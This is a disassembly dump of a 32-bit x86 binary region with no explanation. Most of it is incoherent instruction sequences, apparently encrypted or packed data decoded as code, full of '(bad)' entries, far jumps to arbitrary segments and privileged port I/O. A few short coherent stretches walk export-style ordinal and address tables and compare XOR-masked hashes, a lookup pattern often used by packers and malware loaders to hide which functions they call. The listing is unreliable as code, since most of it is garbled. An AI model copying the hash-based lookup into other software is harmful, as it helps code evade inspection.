  414937:	sub    dh,BYTE PTR [ebp+0x37]
  41493a:	pop    ds
  41493b:	mov    ds:0xce57912c,eax
  414940:	test   ebp,esp
  414942:	cmc    
  414943:	xchg   DWORD PTR [esp+edi*2+0x4a],ecx
  414947:	mov    ?,WORD PTR [eax]
  414949:	aam    0x17
  41494b:	xchg   ecx,eax
  41494c:	fidiv  DWORD PTR [edi+ebx*4]
  41494f:	cmp    eax,0x14575ea7
  414954:	xchg   edi,eax
  414955:	retf   0x4764
  414958:	ds sub al,0xd8
  41495b:	add    DWORD PTR [ecx],esi
  41495d:	pop    esp
  41495e:	dec    ecx
  41495f:	enter  0x5159,0x45
  414963:	into   
  414964:	das    
  414965:	add    eax,0x3cff17b1
  41496a:	sbb    DWORD PTR [eax],eax
  41496c:	sahf   
  41496d:	adc    edi,ecx
  41496f:	arpl   WORD PTR [esi],dx
  414971:	in     al,dx
  414972:	scas   al,BYTE PTR es:[edi]
  414973:	or     eax,esp
  414975:	pop    ebp
  414976:	push   ebx
  414977:	std    
  414978:	sti    
  414979:	add    DWORD PTR [edx],eax
  41497b:	mov    DWORD PTR [edi],edx
  41497d:	ret    0xf726
  414980:	dec    eax
  414981:	jbe    0x414958
  414983:	dec    ebx
  414984:	mov    ecx,DWORD PTR [eax+ebx*2+0x648920c2]
  41498b:	xor    al,0x1
  41498d:	push   esp
  41498e:	pop    es
  41498f:	retf   
  414990:	push   cs
  414991:	das    
  414992:	les    ecx,FWORD PTR [ecx+edx*1+0x4963133f]
  414999:	xor    BYTE PTR [esi],al
  41499b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41499d:	(bad)  
  41499e:	jmp    0x414936
  4149a0:	imul   esp,edi,0x750afe4b
  4149a6:	push   ebx
  4149a7:	(bad)  
  4149a8:	pop    edi
  4149a9:	aad    0xd8
  4149ab:	mov    ch,0x3b
  4149ad:	cmp    ah,BYTE PTR [edx+0x15]
  4149b0:	mov    bh,0x1d
  4149b2:	fnstsw WORD PTR [ebx+0x7d]
  4149b5:	xchg   esi,eax
  4149b6:	scas   al,BYTE PTR es:[edi]
  4149b7:	mov    esp,DWORD PTR [esi+eax*1+0x7585b9b1]
  4149be:	mov    edx,0x1a2318d4
  4149c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c4:	addr16 call 0x577e:0xe66dcd84
  4149cc:	add    esp,ecx
  4149ce:	dec    esp
  4149cf:	test   al,0x5a
  4149d1:	jno    0x414a1a
  4149d3:	iret   
  4149d4:	fwait
  4149d5:	or     ecx,DWORD PTR [ecx+0x3bb34521]
  4149db:	lock xchg ebp,eax
  4149dd:	jns    0x4149ca
  4149df:	icebp  
  4149e0:	cdq    
  4149e1:	sub    BYTE PTR [ebx],dl
  4149e3:	mov    al,0x2c
  4149e5:	jmp    0xa4347f95
  4149ea:	or     al,0xc8
  4149ec:	jp     0x41496f
  4149ee:	cmp    al,0xa
  4149f0:	call   0x42b:0x9f7a09d3
  4149f7:	(bad)  
  4149f8:	mov    edi,0x9c5ff922
  4149fd:	retf   
  4149fe:	push   edi
  4149ff:	dec    ecx
  414a00:	fisttp DWORD PTR [esp+eiz*2]
  414a03:	imul   eax,DWORD PTR [edi],0x5b
  414a06:	shl    BYTE PTR [edx],1
  414a08:	add    ecx,edi
  414a0a:	dec    ebp
  414a0b:	mov    ds:0xc104bec1,al
  414a10:	push   esi
  414a11:	xchg   ebp,eax
  414a12:	push   cs
  414a13:	iret   
  414a14:	sbb    eax,0x6657f8ad
  414a19:	jnp    0x414a48
  414a1b:	pushf  
  414a1c:	sbb    dh,BYTE PTR [edi-0x59]
  414a1f:	cmp    ah,BYTE PTR [edi+0x59162160]
  414a25:	retf   0xf25d
  414a28:	fidiv  DWORD PTR [esi]
  414a2a:	call   0x18f6:0xfa68a975
  414a31:	or     ch,BYTE PTR [ecx+0x35a519f]
  414a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a38:	push   0x362ff218
  414a3d:	and    bl,dl
  414a3f:	jbe    0x4149e1
  414a41:	in     eax,dx
  414a42:	or     eax,0x71890e3f
  414a47:	shr    esp,1
  414a49:	jbe    0x414a7d
  414a4b:	out    dx,eax
  414a4c:	xor    esi,DWORD PTR [edx]
  414a4e:	inc    edi
  414a4f:	pop    ebp
  414a50:	sub    DWORD PTR [edi-0x14],eax
  414a53:	dec    edx
  414a54:	push   0x2e
  414a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a57:	arpl   WORD PTR [edi],dx
  414a59:	mov    ecx,0xa0c0de4e
  414a5e:	std    
  414a5f:	rol    BYTE PTR [ebx+eax*4-0x55c4f272],cl
  414a66:	jbe    0x414a8e
  414a68:	(bad)  
  414a69:	addr16 clc 
  414a6b:	push   esi
  414a6c:	mov    edx,0xc4ba613e
  414a71:	icebp  
  414a72:	and    esp,eax
  414a74:	lahf   
  414a75:	arpl   WORD PTR [ebp-0x70bf1541],ax
  414a7b:	cmp    al,0xa4
  414a7d:	enter  0xd624,0x37
  414a81:	sbb    BYTE PTR [edi+0x5b1d0c7e],0xeb
  414a88:	adc    DWORD PTR [ecx-0x2a],esp
  414a8b:	jg     0x414a6e
  414a8d:	cmp    esp,DWORD PTR [edx-0x47a08368]
  414a93:	out    0xcc,al
  414a95:	test   DWORD PTR ds:0x6eaa819c,esi
  414a9b:	imul   edi,DWORD PTR [edi-0xaee05a7],0xffffffdc
  414aa2:	xchg   esi,eax
  414aa3:	call   0xefec:0x8cc5cbe1
  414aaa:	pop    eax
  414aab:	inc    eax
  414aac:	inc    eax
  414aad:	add    BYTE PTR [ebx],ch
  414aaf:	adc    DWORD PTR [ecx-0x11f44638],0x62
  414ab6:	in     al,dx
  414ab7:	jo     0x414a82
  414ab9:	popf   
  414aba:	sbb    DWORD PTR [esi+0x4212f516],eax
  414ac0:	add    BYTE PTR [esi+0xab556c5],ah
  414ac6:	jo     0x414a64
  414ac8:	push   ecx
  414ac9:	stc    
  414aca:	cmp    esp,DWORD PTR [esi+ebx*8]
  414acd:	or     BYTE PTR [eax+eax*4+0x8],dh
  414ad1:	es popa 
  414ad3:	cli    
  414ad4:	adc    BYTE PTR [ebx],0x6
  414ad7:	mov    ecx,0x8c60c102
  414adc:	jne    0x414acb
  414ade:	adc    al,0x86
  414ae0:	fwait
  414ae1:	dec    eax
  414ae2:	in     eax,0x98
  414ae4:	inc    esp
  414ae5:	xor    al,0xe5
  414ae7:	add    al,0xda
  414ae9:	adc    ah,BYTE PTR [ecx]
  414aeb:	xchg   edi,eax
  414aec:	stos   BYTE PTR es:[edi],al
  414aed:	jmp    0x2273:0xbac00bc8
  414af4:	xchg   ebx,eax
  414af5:	jae    0x414b3c
  414af7:	std    
  414af8:	cli    
  414af9:	hlt    
  414afa:	sbb    eax,0x8b5bd601
  414aff:	sbb    eax,0x50e2bc08
  414b04:	or     BYTE PTR [eax+0x30f87c03],ch
  414b0a:	div    BYTE PTR [edi+0x4d]
  414b0d:	fimul  WORD PTR [ecx]
  414b0f:	idiv   BYTE PTR [edi+esi*1]
  414b12:	push   ebp
  414b13:	les    eax,FWORD PTR [edi+0x36]
  414b16:	mov    dh,0xc0
  414b18:	fld    st(6)
  414b1a:	es in  eax,0xa3
  414b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b1e:	scas   eax,DWORD PTR es:[edi]
  414b1f:	dec    esp
  414b20:	adc    dl,BYTE PTR [edx-0x54]
  414b23:	test   DWORD PTR [ebx-0x38],edx
  414b26:	shr    BYTE PTR [eax+0x2d17aafd],0x79
  414b2d:	jmp    0x414ae3
  414b2f:	scas   al,BYTE PTR es:[edi]
  414b30:	pop    edx
  414b31:	daa    
  414b32:	pop    edi
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	lea    edi,[edi-0x47]
  414bb9:	lds    ebx,FWORD PTR [ebx+0x7b]
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0xad70707e
  414bc3:	sub    eax,0xdb090c23
  414bc8:	cmp    DWORD PTR [eax-0x39],0x40
  414bcc:	std    
  414bcd:	mov    dh,0x7b
  414bcf:	mov    ebx,0x653f8d5a
  414bd4:	imul   ecx,DWORD PTR [esi+0x35],0xffffffa5
  414bd8:	add    al,0x40
  414bda:	fmul   QWORD PTR [edx+0x96779d6]
  414be0:	jmp    0x414c0e
  414be2:	jge    0x414c17
  414be4:	push   esi
  414be5:	(bad)  
  414be6:	xor    ebp,DWORD PTR [ecx]
  414be8:	(bad)  
  414be9:	int3   
  414bea:	loope  0x414b90
  414bec:	cmp    esp,esi
  414bee:	mov    eax,0x1ac255cf
  414bf3:	push   edi
  414bf4:	rcr    DWORD PTR [ebx],cl
  414bf6:	les    edx,FWORD PTR [ebp+0x7b]
  414bf9:	outs   dx,BYTE PTR ds:[esi]
  414bfa:	pushf  
  414bfb:	jecxz  0x414bdf
  414bfd:	cmp    al,0x29
  414bff:	sbb    BYTE PTR [eax+0x60],dl
  414c02:	pop    ds
  414c03:	push   ecx
  414c04:	mov    WORD PTR [ecx],gs
  414c06:	xchg   esp,eax
  414c07:	jmp    0xa4dd4964
  414c0c:	cld    
  414c0d:	ds jp  0x414c45
  414c10:	jl     0x414c1f
  414c12:	test   esp,ebx
  414c14:	ret    0xf1e5
  414c17:	scas   al,BYTE PTR es:[edi]
  414c18:	adc    al,0x3f
  414c1a:	out    0x89,eax
  414c1c:	mov    edi,0xed56654
  414c21:	std    
  414c22:	jg     0x414c88
  414c24:	(bad)  
  414c25:	mov    esp,0x4f8f0bcb
  414c2a:	inc    esi
  414c2b:	arpl   di,bx
  414c2d:	push   es
  414c2e:	mov    dl,0x7c
  414c30:	adc    ch,BYTE PTR [edi]
  414c32:	iret   
  414c33:	dec    esp
  414c34:	ror    BYTE PTR [edx+eiz*2+0x33],0x30
  414c39:	add    eax,0xfbc12266
  414c3e:	cli    
  414c3f:	into   
  414c40:	test   eax,0xe354ab67
  414c45:	pop    ds
  414c46:	fwait
  414c47:	xchg   esi,eax
  414c48:	leave  
  414c49:	xchg   esp,eax
  414c4a:	retf   
  414c4b:	push   ss
  414c4c:	inc    ecx
  414c4d:	adc    al,0x4d
  414c50:	inc    esp
  414c51:	mov    ecx,0xc6bb14c6
  414c56:	jnp    0x414c4d
  414c58:	cmp    DWORD PTR [edi],0x9bda8f17
  414c5e:	shl    edi,0x73
  414c61:	test   ebp,esi
  414c63:	pop    esi
  414c64:	sub    al,0x21
  414c66:	div    BYTE PTR [ebp+ecx*4+0x7ee2927a]
  414c6d:	jle    0x414bf7
  414c6f:	jo     0x414c4b
  414c71:	popf   
  414c72:	cmp    eax,0xd1cca518
  414c77:	push   ebp
  414c78:	mov    WORD PTR [edx],cs
  414c7a:	push   0x4595c7a8
  414c7f:	fist   WORD PTR [edx-0x2d]
  414c82:	add    DWORD PTR [edi+eiz*8],edi
  414c85:	or     BYTE PTR [eax-0x8],dl
  414c88:	sub    edi,esp
  414c8a:	sbb    bl,BYTE PTR [edx+0x45]
  414c8d:	dec    edx
  414c8e:	hlt    
  414c8f:	xlat   BYTE PTR ds:[ebx]
  414c90:	sub    al,0x53
  414c92:	into   
  414c93:	enter  0xefc2,0x48
  414c97:	(bad)  
  414c99:	or     BYTE PTR [esi+ebp*8+0x54],ch
  414c9d:	xor    DWORD PTR [eax],edi
  414c9f:	int    0x58
  414ca1:	and    bl,BYTE PTR [eax]
  414ca3:	push   ebx
  414ca4:	sub    ebx,0xffffffd8
  414ca7:	scas   eax,DWORD PTR es:[edi]
  414ca8:	dec    edx
  414ca9:	adc    bl,BYTE PTR [esi-0x4d]
  414cac:	inc    ecx
  414cad:	sub    BYTE PTR ds:[edi-0x5],cl
  414cb1:	sub    dl,BYTE PTR [ebp-0x12]
  414cb4:	arpl   WORD PTR [si],si
  414cb7:	imul   edi,DWORD PTR [edi+0x544818fe],0x1ed3f46c
  414cc1:	fnsave [ebp-0x42]
  414cc4:	mul    BYTE PTR [esi+eiz*8]
  414cc7:	xchg   esi,eax
  414cc8:	xchg   edx,eax
  414cc9:	push   0xe
  414ccb:	sub    BYTE PTR [ecx-0x45287608],0xe8
  414cd2:	mov    eax,ds:0x47c90979
  414cd7:	mov    bl,0x10
  414cd9:	add    al,0xc0
  414cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cdc:	scas   eax,DWORD PTR es:[edi]
  414cdd:	xchg   edx,eax
  414cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cdf:	jo     0x414cb9
  414ce1:	mov    esp,0x114ab3c0
  414ce6:	or     eax,0xe3bf9f5
  414ceb:	xchg   BYTE PTR [esp+ebx*8-0x30296409],ah
  414cf2:	or     al,0x3d
  414cf4:	and    DWORD PTR es:[ecx+ebp*4],eax
  414cf8:	mov    BYTE PTR [esi-0x80],al
  414cfb:	xchg   ebp,eax
  414cfc:	jge    0x414c8c
  414cfe:	jge    0x414cf4
  414d00:	xchg   ecx,eax
  414d01:	in     eax,0x2f
  414d03:	mov    ebx,0x175db05a
  414d08:	fsub   DWORD PTR [edx-0x447856df]
  414d0e:	mov    dl,0x33
  414d10:	push   ebp
  414d11:	or     eax,0x14ed7e0c
  414d16:	add    al,0x16
  414d18:	ss pop ebp
  414d1a:	or     ebx,DWORD PTR [edi]
  414d1c:	mov    bh,0x24
  414d1e:	shl    DWORD PTR fs:[edi+0x46],cl
  414d22:	mov    al,bh
  414d24:	and    al,0xe
  414d26:	adc    BYTE PTR [esi+0x5d89c9b1],cl
  414d2c:	jmp    0x414d03
  414d2e:	mov    ebp,0xed00ec25
  414d33:	into   
  414d34:	mov    ecx,0x131994c
  414d39:	inc    esp
  414d3a:	xchg   ebp,eax
  414d3b:	pusha  
  414d3c:	das    
  414d3d:	imul   edx,DWORD PTR [ebx+0xe],0xdbf69149
  414d44:	sub    DWORD PTR [edx],esi
  414d46:	xlat   BYTE PTR ds:[ebx]
  414d47:	inc    eax
  414d48:	aas    
  414d49:	xchg   DWORD PTR [eax+0x18],edx
  414d4c:	dec    eax
  414d4d:	or     al,0x3a
  414d4f:	fisubr WORD PTR [ebp+ebp*1-0x32eb8bf3]
  414d56:	pop    es
  414d57:	or     al,BYTE PTR ds:0x4f35234a
  414d5d:	or     ebp,DWORD PTR [eax+0x6f]
  414d60:	(bad)  
  414d61:	fstp   TBYTE PTR [ecx]
  414d63:	cmp    ebx,DWORD PTR [ecx+0x3ebffdb4]
  414d69:	dec    esi
  414d6a:	pop    ebx
  414d6b:	sbb    ebp,esi
  414d6d:	in     eax,0x6d
  414d6f:	jbe    0x414d45
  414d71:	je     0x414d70
  414d73:	stc    
  414d74:	mov    ecx,0x94c09865
  414d79:	test   al,0x23
  414d7b:	inc    esp
  414d7c:	xchg   esp,eax
  414d7d:	cmp    ah,BYTE PTR [esi+0x33]
  414d80:	inc    edx
  414d81:	sbb    ebx,DWORD PTR [eax+0x29]
  414d84:	mul    DWORD PTR [eax-0x78]
  414d87:	iret   
  414d88:	aam    0xed
  414d8a:	push   ds
  414d8b:	out    dx,al
  414d8c:	mov    ds:0xe9104476,eax
  414d91:	dec    esp
  414d92:	xchg   edx,eax
  414d93:	dec    esp
  414d94:	je     0x414e05
  414d96:	ret    0x8d84
  414d99:	jnp    0x414da2
  414d9b:	xchg   edi,eax
  414d9c:	(bad)  
  414d9d:	sbb    eax,0x777f3a3d
  414da2:	lahf   
  414da3:	cli    
  414da4:	pop    ecx
  414da5:	cdq    
  414da6:	sub    dh,BYTE PTR [ecx+edi*4]
  414da9:	mov    edi,?
  414dab:	pop    es
  414dac:	inc    ecx
  414dad:	js     0x414db0
  414daf:	sbb    bh,dh
  414db1:	bound  esp,QWORD PTR [ecx]
  414db3:	call   0x4d97:0x1d5da84a
  414dba:	stos   DWORD PTR es:[edi],eax
  414dbb:	jmp    0x97e3:0xc87611f6
  414dc2:	fsub   st,st(6)
  414dc4:	test   al,0xe7
  414dc6:	icebp  
  414dc7:	call   0x8540bfd2
  414dcc:	pop    es
  414dcd:	sub    al,0x2b
  414dcf:	ret    0x42ae
  414dd2:	sbb    ebp,DWORD PTR [ecx+0x53]
  414dd5:	out    dx,al
  414dd6:	sub    DWORD PTR [ebx+edx*4-0x5e],ecx
  414dda:	and    ah,BYTE PTR [ecx-0x40]
  414ddd:	adc    ch,BYTE PTR [esp+edi*4-0x31]
  414de1:	popa   
  414de2:	adc    esi,ecx
  414de4:	xor    eax,0x42961dc8
  414de9:	push   eax
  414dea:	rcl    dh,1
  414dec:	mov    dh,0xb6
  414dee:	jg     0x414dc9
  414df0:	dec    esp
  414df1:	mov    ds:0x3f3d8d97,eax
  414df6:	mov    ebp,0x29526e46
  414dfb:	out    dx,al
  414dfc:	cmp    dh,BYTE PTR [edx]
  414dfe:	scas   al,BYTE PTR es:[edi]
  414dff:	xchg   eax,ecx
  414e01:	(bad)  
  414e02:	pop    eax
  414e03:	loop   0x414e70
  414e05:	add    edi,DWORD PTR [ebp-0x25]
  414e08:	aad    0x82
  414e0a:	push   cs
  414e0b:	int    0x62
  414e0d:	mov    esi,0x913aa452
  414e12:	outs   dx,BYTE PTR ds:[esi]
  414e13:	rol    BYTE PTR [esi],0x4f
  414e16:	mov    WORD PTR [eax],gs
  414e18:	dec    ecx
  414e19:	xchg   edi,eax
  414e1a:	pop    esi
  414e1b:	and    esp,edi
  414e1d:	push   0x65ee7cce
  414e22:	je     0x414ddc
  414e24:	bound  ecx,QWORD PTR [edx]
  414e26:	xor    ebx,eax
  414e28:	leave  
  414e29:	pusha  
  414e2a:	fiadd  DWORD PTR [edx+0x9]
  414e2d:	clc    
  414e2e:	jbe    0x414dde
  414e30:	push   es
  414e31:	push   ss
  414e32:	rcr    bh,0xd3
  414e35:	mov    eax,ds:0x78343785
  414e3a:	cli    
  414e3b:	mov    eax,0x333e4b44
  414e40:	mov    esp,0x9fa5e461
  414e45:	loop   0x414e17
  414e47:	shr    ah,cl
  414e49:	inc    ebx
  414e4a:	mov    al,ds:0x8314a165
  414e4f:	ror    BYTE PTR [ebp+0x30],1
  414e52:	sbb    eax,DWORD PTR [ecx+0x604cae7]
  414e58:	inc    ah
  414e5a:	fadd   st(5),st
  414e5c:	call   0x3dc4:0x380bc6f1
  414e63:	push   eax
  414e64:	pop    ss
  414e65:	pop    ecx
  414e66:	mov    WORD PTR [bx+0x4b99],es
  414e6b:	jnp    0x414e44
  414e6d:	mov    ds:0x436a18e3,al
  414e72:	bnd je 0x414e03
  414e75:	stc    
  414e76:	xor    eax,0x17c6c9bf
  414e7b:	jl     0x414ecc
  414e7d:	sar    eax,1
  414e7f:	mov    bh,0x88
  414e81:	ret    0x9731
  414e84:	sbb    al,0x17
  414e86:	iret   
  414e87:	sbb    al,0x43
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	gs ror bl,1
  414eaf:	shl    BYTE PTR [eax+edi*2+0x7eb9707f],1
  414eb6:	jo     0x414f28
  414eb8:	jo     0x414e91
  414eba:	mov    ds:0x918e5e26,al
  414ebf:	pop    edi
  414ec0:	jne    0x414eb2
  414ec2:	int3   
  414ec3:	push   ss
  414ec4:	lahf   
  414ec5:	pop    eax
  414ec6:	clc    
  414ec7:	inc    esi
  414ec8:	jg     0x414eac
  414eca:	int3   
  414ecb:	xor    eax,0x9458592a
  414ed1:	push   esi
  414ed2:	loopne 0x414ed7
  414ed4:	dec    ebx
  414ed5:	sbb    dl,BYTE PTR [eax]
  414ed7:	adc    eax,0x425c2d7d
  414edc:	push   esp
  414edd:	rcr    DWORD PTR [eiz*1-0x5456d3fe],cl
  414ee4:	jl     0x414f23
  414ee6:	mov    dh,0xa7
  414ee8:	push   ds
  414ee9:	test   al,0x7a
  414eeb:	sbb    al,0x53
  414eed:	icebp  
  414eee:	loope  0x414f6b
  414ef0:	fmul   QWORD PTR [ecx]
  414ef2:	mov    bh,0x3b
  414ef4:	xchg   esi,eax
  414ef5:	sbb    ebx,ebx
  414ef7:	lahf   
  414ef8:	add    BYTE PTR [ebx],dh
  414efa:	add    al,0xf9
  414efc:	cli    
  414efd:	xlat   BYTE PTR ds:[ebx]
  414efe:	inc    ebx
  414eff:	mov    esp,0xc358866
  414f04:	ds scas eax,DWORD PTR es:[edi]
  414f06:	jb     0x414eaa
  414f08:	pop    ds
  414f09:	mov    ch,0xbd
  414f0b:	jmp    0x8f4e:0xab581607
  414f12:	dec    edi
  414f13:	ins    BYTE PTR es:[edi],dx
  414f14:	fmul   DWORD PTR [eax]
  414f16:	in     al,dx
  414f17:	aam    0x88
  414f19:	inc    ebp
  414f1a:	mov    ?,WORD PTR fs:[edx-0x2502faf5]
  414f21:	sbb    dh,BYTE PTR [ebp-0x4b]
  414f24:	inc    ecx
  414f25:	xchg   ebx,eax
  414f26:	ins    BYTE PTR es:[edi],dx
  414f27:	dec    esp
  414f28:	lahf   
  414f29:	out    0x5d,eax
  414f2b:	xchg   ecx,eax
  414f2c:	in     al,dx
  414f2d:	fs or  eax,0xce4d9ec5
  414f33:	popa   
  414f34:	stos   DWORD PTR es:[edi],eax
  414f35:	sbb    DWORD PTR [edx],edx
  414f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f38:	call   0x11481f73
  414f3d:	add    BYTE PTR [ecx+esi*4+0xd],0x5e
  414f42:	aad    0x7a
  414f44:	add    eax,0xbb210634
  414f49:	in     al,0xbb
  414f4b:	inc    eax
  414f4c:	jmp    0x414f07
  414f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f4f:	mov    bl,0x34
  414f51:	pop    edx
  414f52:	test   eax,0xbd0a8c8a
  414f57:	rol    ch,cl
  414f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f5a:	sub    dh,cl
  414f5c:	jmp    0x414f66
  414f5e:	dec    ecx
  414f5f:	dec    esi
  414f60:	xor    BYTE PTR [esi],ch
  414f62:	std    
  414f63:	mov    ebp,0x42af64a6
  414f68:	xor    DWORD PTR [ecx+0x7c],0xa8cf44c0
  414f6f:	in     al,0x5
  414f71:	out    dx,al
  414f72:	xor    cl,BYTE PTR [ebx+0x77]
  414f75:	dec    edx
  414f76:	test   eax,0xa0b45e95
  414f7b:	repnz retf 0xef54
  414f7f:	dec    edx
  414f80:	pop    ecx
  414f81:	aas    
  414f82:	gs (bad) 
  414f84:	pop    ecx
  414f85:	mov    ds:0x175e1b8f,al
  414f8a:	clc    
  414f8b:	ficom  DWORD PTR [ecx-0x6d]
  414f8e:	push   ss
  414f8f:	dec    ecx
  414f90:	popf   
  414f91:	(bad)  
  414f92:	inc    ebx
  414f93:	rol    BYTE PTR [esi+ebx*4-0x5f4461e],0xc
  414f9b:	sub    dl,BYTE PTR [ebp+0x51724d99]
  414fa1:	push   DWORD PTR [esi+0x9eeed64]
  414fa7:	lds    esi,FWORD PTR [ecx+ebp*2-0x7896711b]
  414fae:	lar    esp,WORD PTR [ecx]
  414fb1:	cmc    
  414fb2:	jge    0x415032
  414fb4:	ficomp WORD PTR [eax]
  414fb6:	out    dx,eax
  414fb7:	pop    DWORD PTR [ecx-0x6a]
  414fba:	dec    ecx
  414fbb:	leave  
  414fbc:	mov    ebp,0xd7f27a2
  414fc1:	cmp    eax,0xf8fdb208
  414fc6:	ja     0x41500a
  414fc8:	adc    cl,bl
  414fca:	popa   
  414fcb:	aam    0x9c
  414fcd:	and    al,0xf8
  414fcf:	dec    ebp
  414fd0:	and    BYTE PTR [edi+0x305b5f55],0x57
  414fd7:	cli    
  414fd8:	neg    DWORD PTR [ecx-0x180297db]
  414fde:	xchg   DWORD PTR [ebx],ecx
  414fe0:	fs mov cl,cl
  414fe3:	fcmovne st,st(3)
  414fe5:	mov    bl,0xd3
  414fe7:	aad    0xb0
  414fe9:	test   dh,0x31
  414fec:	cmc    
  414fed:	xchg   ecx,eax
  414fee:	xor    cl,BYTE PTR [ecx+ebp*1+0x56]
  414ff2:	fld    DWORD PTR es:[ebx+eax*8+0x17014a33]
  414ffa:	bound  edx,QWORD PTR [edx+0x3f042b7b]
  415000:	jae    0x414fbf
  415002:	cmp    DWORD PTR [eax+edx*4+0x421c7ce5],0x7ecb843e
  41500d:	mov    BYTE PTR [esp+eax*4-0x6e],bl
  415011:	inc    ecx
  415012:	jge    0x41506b
  415014:	xchg   ebx,eax
  415015:	popa   
  415016:	aas    
  415017:	repz mov eax,0x2a106e7a
  41501d:	(bad)  
  41501e:	pop    esp
  41501f:	dec    edx
  415020:	cmp    eax,DWORD PTR [ebp+ecx*2+0x25af184c]
  415027:	repz popa 
  415029:	push   ebp
  41502a:	add    al,0x61
  41502c:	in     eax,dx
  41502d:	cdq    
  41502e:	inc    eax
  41502f:	popa   
  415030:	(bad)  
  415031:	pusha  
  415032:	pop    ecx
  415033:	leave  
  415034:	sbb    ch,BYTE PTR [esi]
  415036:	push   ds
  415037:	and    bh,BYTE PTR [esi+ebp*4+0x7d]
  41503b:	adc    DWORD PTR [ebx+ebp*2],ebp
  41503e:	mov    bh,0xde
  415040:	mov    esi,0xa45d7dc6
  415045:	push   ss
  415046:	xchg   edi,eax
  415047:	stc    
  415048:	ror    ch,1
  41504a:	push   edi
  41504b:	sti    
  41504c:	je     0x415008
  41504e:	icebp  
  41504f:	ins    DWORD PTR es:[edi],dx
  415050:	jno    0x415086
  415052:	in     eax,0xcd
  415054:	cmp    DWORD PTR [esp+edx*4-0x73],esp
  415058:	and    bl,BYTE PTR [eax+0x175bcb95]
  41505e:	pop    ecx
  41505f:	into   
  415060:	ds in  al,dx
  415062:	mov    bh,0x25
  415064:	cmp    BYTE PTR [esi-0x65],bh
  415067:	out    0x95,al
  415069:	(bad)  
  41506b:	cs inc ecx
  41506d:	out    dx,eax
  41506e:	bnd jbe 0x4150a9
  415071:	mov    bl,0x61
  415073:	mov    bh,0x5
  415075:	icebp  
  415076:	xlat   BYTE PTR ds:[ebx]
  415077:	mov    fs,eax
  415079:	sub    al,0xd1
  41507b:	out    0x96,eax
  41507d:	hlt    
  41507e:	jns    0x41504e
  415080:	ret    
  415081:	dec    ecx
  415082:	xor    eax,0xab8c1510
  415087:	push   ebx
  415088:	mov    ah,0x5f
  41508a:	sti    
  41508b:	sbb    al,0xc
  41508d:	enter  0x897c,0xef
  415091:	jnp    0x41506e
  415093:	test   DWORD PTR [edi+0x18],ebp
  415096:	retf   0x3b5f
  415099:	xchg   ecx,eax
  41509a:	mov    esp,0xef0f831e
  41509f:	push   eax
  4150a0:	imul   ebp,DWORD PTR [ebx-0x73702702],0xdd126d6
  4150aa:	add    eax,0xea1c95c1
  4150af:	dec    ebx
  4150b0:	mov    dh,0xfe
  4150b2:	adc    al,0x92
  4150b4:	adc    bh,BYTE PTR [esi]
  4150b6:	jge    0x41510e
  4150b8:	cmc    
  4150b9:	or     DWORD PTR ds:0x1d1cc7a4,esp
  4150bf:	adc    al,0xe0
  4150c1:	leave  
  4150c2:	sti    
  4150c3:	fisttp WORD PTR [edi-0x573a5441]
  4150c9:	mov    ch,0x56
  4150cb:	shl    BYTE PTR [edi+0x3a0170c4],1
  4150d1:	ins    DWORD PTR es:[edi],dx
  4150d2:	push   esp
  4150d3:	xchg   edi,eax
  4150d4:	jns    0x4150e5
  4150d6:	fs and al,0x99
  4150d9:	(bad)  [eax-0x7e]
  4150dc:	retf   0xe099
  4150df:	pop    ss
  4150e0:	push   ecx
  4150e1:	sbb    edi,ecx
  4150e3:	xchg   esp,eax
  4150e4:	mov    ebx,0x83bfe8ea
  4150e9:	xchg   DWORD PTR [ecx+0x40],edx
